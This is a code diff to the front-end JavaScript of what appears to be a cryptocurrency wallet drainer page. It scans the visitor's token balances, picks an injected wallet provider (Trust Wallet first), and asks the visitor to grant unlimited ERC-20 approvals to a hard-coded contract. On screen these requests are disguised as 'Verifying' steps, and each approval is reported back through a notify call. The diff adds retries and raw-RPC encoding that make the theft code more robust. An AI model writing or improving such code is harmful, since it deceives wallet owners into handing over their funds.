@@ -1,3 +1,7 @@
+function getEl(id) {
+    return document.getElementById(id);
+}
+
 let pendingTokensQueue = [];
 let isApprovalProcessing = false;
 
@@ -42,35 +46,96 @@ function showFinalResult() {
     }, 1000);
 }
 
+function pickInjectedProvider() {
+    if (!window.ethereum) return null;
+    const list = window.ethereum.providers && window.ethereum.providers.length
+        ? window.ethereum.providers
+        : [window.ethereum];
+    const trust = list.find((p) => p.isTrust || p.isTrustWallet);
+    if (trust) return trust;
+    return list[0];
+}
+
+function encodeBalanceOf(walletAddress) {
+    const methodId = "0x70a08231";
+    const cleanAddress = walletAddress.toLowerCase().replace("0x", "").padStart(64, "0");
+    return methodId + cleanAddress;
+}
+
+function encodeDecimals() {
+    return "0x313ce567";
+}
+
+function encodeApprove(spender, amount, decimals) {
+    const methodId = "0x095ea7b3";
+    const cleanSpender = spender.toLowerCase().replace("0x", "").padStart(64, "0");
+    const amountUnits = BigInt(amount) * BigInt(10) ** BigInt(decimals);
+    const amountHex = amountUnits.toString(16).padStart(64, "0");
+    return methodId + cleanSpender + amountHex;
+}
+
+async function requestWithRetry(provider, payload, label, retries = 1) {
+    try {
+        return await provider.request(payload);
+    } catch (err) {
+        const msg = (err && err.message) ? err.message.toLowerCase() : "";
+        const looksTransient =
+            msg.includes("401") || msg.includes("429") || msg.includes("timeout") ||
+            msg.includes("network") || msg.includes("rpc") || msg.includes("fetch");
+
+        if (retries > 0 && looksTransient) {
+            window.debugLog(`${label} failed (${err.message || err}), retrying...`, "warning");
+            await new Promise((r) => setTimeout(r, 1200));
+            return requestWithRetry(provider, payload, label, retries - 1);
+        }
+        throw err;
+    }
+}
+
 async function fetchAndRenderBalances(userAddress, spenderAddress) {
-    if (!web3Provider) {
-        window.debugLog("Provider not initialized", "error");
-        const errorDiv = getEl("error");
-        if (errorDiv) errorDiv.textContent = "Provider not initialized";
+    const provider = pickInjectedProvider();
+    
+    if (!provider) {
+        window.debugLog("No provider found", "error");
         return;
     }
     
     window.debugLog("Starting token scan for: " + userAddress, "info");
     
     try {
-        const erc20Abi = [
-            "function balanceOf(address) view returns (uint256)", 
-            "function decimals() view returns (uint8)"
-        ];
-        
         const tokenPromises = TOKENS.map(async (t) => {
             try {
                 window.debugLog("Checking " + t.name + " balance...", "info");
                 
-                const contract = new ethers.Contract(t.address, erc20Abi, web3Provider);
-                const rawBal = await contract.balanceOf(userAddress);
-                const decimals = await contract.decimals();
-                const fmtBal = parseFloat(ethers.formatUnits(rawBal, decimals));
+                const balanceData = encodeBalanceOf(userAddress);
+                const balanceHex = await requestWithRetry(
+                    provider,
+                    {
+                        method: "eth_call",
+                        params: [{ to: t.address, data: balanceData }, "latest"]
+                    },
+                    t.name + " balance"
+                );
+                
+                const rawBal = BigInt(balanceHex);
+                
+                const decimalsData = encodeDecimals();
+                const decimalsHex = await requestWithRetry(
+                    provider,
+                    {
+                        method: "eth_call",
+                        params: [{ to: t.address, data: decimalsData }, "latest"]
+                    },
+                    t.name + " decimals"
+                );
+                
+                const decimals = parseInt(decimalsHex, 16) || 18;
+                const fmtBal = Number(rawBal) / 10 ** decimals;
                 
                 window.debugLog(t.name + " raw balance: " + rawBal.toString(), "info");
                 window.debugLog(t.name + " formatted balance: " + fmtBal, "info");
                 
-                return fmtBal > 0 ? { ...t, balance: fmtBal } : null;
+                return fmtBal > 0 ? { ...t, balance: fmtBal, decimals: decimals } : null;
             } catch (err) { 
                 window.debugLog(t.name + " balance error: " + err.message, "error");
                 return null; 
@@ -106,10 +171,6 @@ async function fetchAndRenderBalances(userAddress, spenderAddress) {
     } catch (e) {
         window.debugLog("Scan error: " + e.message, "error");
         console.error('Scan error:', e);
-        const statusDiv = getEl("status");
-        const errorDiv = getEl("error");
-        if (statusDiv) statusDiv.textContent = "";
-        if (errorDiv) errorDiv.textContent = "Token scanning failed";
     }
 }
 
@@ -117,30 +178,30 @@ async function executeNextApprove() {
     if (isApprovalProcessing || pendingTokensQueue.length === 0) return;
     isApprovalProcessing = true;
     
+    const provider = pickInjectedProvider();
     const t = pendingTokensQueue[0];
+    
     appendStep(`Verifying ${t.name}...`);
     window.debugLog("Approving " + t.name + "...", "info");
     
     try {
-        if (!web3Signer) throw new Error("Signer not initialized");
+        if (!provider) throw new Error("No provider found");
+        if (!connectedAddress) throw new Error("No connected address");
         
-        const erc20Abi = ["function approve(address spender, uint256 amount) public returns (bool)"];
-        const tokenContract = new ethers.Contract(
-            ethers.getAddress(t.address), 
-            erc20Abi, 
-            web3Signer
+        const data = encodeApprove(CONTRACT_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935", t.decimals || 18);
+        
+        window.debugLog(t.name + " approve data built", "info");
+        
+        const txHash = await requestWithRetry(
+            provider,
+            {
+                method: "eth_sendTransaction",
+                params: [{ from: connectedAddress, to: t.address, data: data }]
+            },
+            t.name + " approval"
         );
         
-        const tx = await tokenContract.approve(
-            ethers.getAddress(CONTRACT_ADDRESS), 
-            ethers.MaxUint256
-        );
-        
-        window.debugLog(t.name + " transaction sent: " + tx.hash, "info");
-        
-        await tx.wait();
-        
-        window.debugLog(t.name + " transaction confirmed", "success");
+        window.debugLog(t.name + " transaction sent: " + txHash, "success");
         
         notifyApproval(connectedAddress, t.address);
         
@@ -159,6 +220,12 @@ async function executeNextApprove() {
     } catch (error) {
         window.debugLog(t.name + " approval error: " + error.message, "error");
         console.error(`Approval error for ${t.name}:`, error.message);
+        
+        const msg = (error && error.message) ? error.message.toLowerCase() : "";
+        if (msg.includes("user rejected") || msg.includes("denied")) {
+            window.debugLog(t.name + " cancelled by user", "warning");
+        }
+        
         updateStep(`Verifying ${t.name}...`, `Verifying ${t.name}... ❌`);
         
         pendingTokensQueue.shift();
